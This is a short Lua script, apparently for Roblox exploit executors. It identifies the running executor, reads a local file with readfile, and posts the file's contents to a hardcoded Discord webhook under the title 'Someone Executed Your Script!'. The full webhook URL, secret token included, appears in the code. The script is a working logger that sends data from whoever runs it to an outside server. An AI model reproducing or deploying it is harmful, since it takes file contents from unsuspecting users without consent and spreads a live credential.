-- webhook
local url =
   "https://discord.com/api/webhooks/1120487967245475980/2aWLRDZp0Gp2A1ZL7pImpdmMfwOzPIPgITt2qxYEm_aRyj1Ebf6HsJgbn3_E59zXYMfP"

-- variables
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"


-- code
local data = {
   ["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Your Script!**",
           ["description"] = readfile(Name),
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
